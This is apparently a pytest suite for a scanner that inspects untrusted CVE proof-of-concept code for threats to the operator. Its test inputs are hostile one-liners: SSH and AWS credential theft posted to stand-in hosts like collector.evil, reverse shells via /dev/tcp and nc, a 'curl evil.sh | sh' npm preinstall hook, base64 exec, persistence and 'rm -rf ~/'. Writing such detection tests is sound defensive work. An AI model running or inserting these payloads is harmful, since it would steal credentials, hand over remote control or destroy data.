"""Inspection of third-party PoC code.

The samples below are modelled on the real thing: repositories advertising a
PoC for a fresh CVE that also steal the researcher's credentials. The operator
running them holds access to client environments, which is exactly why they get
targeted. Every test here is a payload that must not slip past unremarked.
"""
from __future__ import annotations

import pytest

from app.sandbox.inspect import external_hosts, inspect_code

SCOPE = ["app.example.com"]


def sev_of(report, category):
    return [s.severity for s in report.signals if s.category == category]


# ---- Credential theft aimed at the operator ----

def test_ssh_key_theft_is_critical():
    report = inspect_code(
        "import requests\n"
        "key = open('/root/.ssh/id_rsa').read()\n"
        "requests.post('https://collector.evil/x', data=key)\n",
        scope_hosts=SCOPE)
    assert "critical" in sev_of(report, "credential_access")
    assert report.verdict == "hostile"


def test_aws_credential_theft_is_critical():
    report = inspect_code("open(os.path.expanduser('~/.aws/credentials')).read()",
                          scope_hosts=SCOPE)
    assert "critical" in sev_of(report, "credential_access")


def test_reading_the_environment_is_flagged():
    """This tool's own provider API keys live there."""
    report = inspect_code("import os\ntok = os.environ['GITHUB_TOKEN']", scope_hosts=SCOPE)
    assert sev_of(report, "credential_access")


def test_ordinary_env_lookups_are_not_flagged():
    """HOME/PATH are noise; flagging them trains the operator to ignore the panel."""
    report = inspect_code("import os\nhome = os.environ.get('HOME')", scope_hosts=SCOPE)
    assert not sev_of(report, "credential_access")


def test_browser_store_theft_is_flagged():
    assert sev_of(inspect_code("cp ~/.mozilla/**/logins.json /tmp/", scope_hosts=SCOPE),
                  "credential_access")


# ---- Remote control ----

@pytest.mark.parametrize("payload", [
    "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
    "nc -e /bin/sh 1.2.3.4 4444",
    "import pty; pty.spawn('/bin/bash')",
])
def test_reverse_shells_are_critical(payload):
    report = inspect_code(payload, scope_hosts=SCOPE)
    assert "critical" in sev_of(report, "reverse_shell")
    assert report.verdict == "hostile"


# ---- Hidden payloads ----

def test_executing_decoded_data_is_critical():
    report = inspect_code("exec(base64.b64decode('cHJpbnQoMSk='))", scope_hosts=SCOPE)
    assert "critical" in sev_of(report, "obfuscation")


def test_javascript_obfuscation_is_flagged():
    assert sev_of(inspect_code("eval(atob('YWxlcnQoMSk='))", scope_hosts=SCOPE),
                  "obfuscation")


# ---- Install-time execution: runs before you ever invoke it ----

def test_setup_py_install_hook_is_critical():
    report = inspect_code(
        "from setuptools import setup\nsetup(name='poc', cmdclass={'install': Evil})",
        scope_hosts=SCOPE)
    assert "critical" in sev_of(report, "install_hook")


def test_npm_preinstall_is_critical():
    assert "critical" in sev_of(
        inspect_code('"scripts": {"preinstall": "curl evil.sh | sh"}', scope_hosts=SCOPE),
        "install_hook")


# ---- Persistence and destruction ----

def test_persistence_is_critical():
    assert "critical" in sev_of(
        inspect_code("echo 'x' >> ~/.bashrc", scope_hosts=SCOPE), "persistence")


def test_destructive_commands_are_critical():
    assert "critical" in sev_of(
        inspect_code("os.system('rm -rf ~/')", scope_hosts=SCOPE), "destructive")


# ---- Where does it phone home ----

def test_the_target_is_not_an_external_host():
    """A genuine PoC talks to the target. That is the point."""
    code = "requests.get('https://app.example.com/vuln?id=1')"
    assert external_hosts(code, SCOPE) == []


def test_a_subdomain_of_the_scope_is_in_scope():
    assert external_hosts("requests.get('https://api.app.example.com/x')", SCOPE) == []


def test_anything_else_is_surfaced():
    code = "requests.post('https://collector.evil/steal', data=x)"
    assert external_hosts(code, SCOPE) == ["collector.evil"]


def test_package_sources_are_not_exfiltration():
    code = "pip install -i https://pypi.org/simple foo\n# see https://github.com/x/y"
    assert external_hosts(code, SCOPE) == []


def test_collector_services_are_called_out_by_name():
    assert sev_of(inspect_code("requests.post('https://webhook.site/abc')",
                               scope_hosts=SCOPE), "exfiltration")


def test_telegram_exfil_is_critical():
    assert "critical" in sev_of(
        inspect_code("requests.post('https://api.telegram.org/bot123/sendDocument')",
                     scope_hosts=SCOPE), "exfiltration")


# ---- Signals are anchored so a human can check them ----

def test_signals_carry_the_line_number_and_text():
    report = inspect_code("print('ok')\nkey = open('/root/.ssh/id_rsa').read()\n",
                          scope_hosts=SCOPE)
    sig = next(s for s in report.signals if s.category == "credential_access")
    assert sig.line_no == 2
    assert "id_rsa" in sig.line


def test_worst_signals_come_first():
    report = inspect_code(
        "requests.post('https://x.evil/a')\n"
        "open('/root/.ssh/id_rsa')\n", scope_hosts=SCOPE)
    assert report.signals[0].severity == "critical"


# ---- A clean-looking file is never called clean ----

def test_a_plain_poc_is_not_declared_safe():
    """Static analysis of hostile code is defeatable. Implying a clean bill of
    health is the dangerous part, so the wording must not."""
    report = inspect_code(
        "import requests\n"
        "r = requests.get('https://app.example.com/cgi-bin/x?cmd=id')\n"
        "print(r.text)\n", scope_hosts=SCOPE)
    assert report.signals == []
    assert "not a clean bill of health" in report.summary
    assert report.verdict == "review"


def test_empty_input_is_handled():
    assert inspect_code("", scope_hosts=SCOPE).summary == "empty file"


def test_report_serializes():
    d = inspect_code("open('/root/.ssh/id_rsa')", scope_hosts=SCOPE).to_dict()
    assert d["verdict"] == "hostile"
    assert d["signals"][0]["category"] == "credential_access"
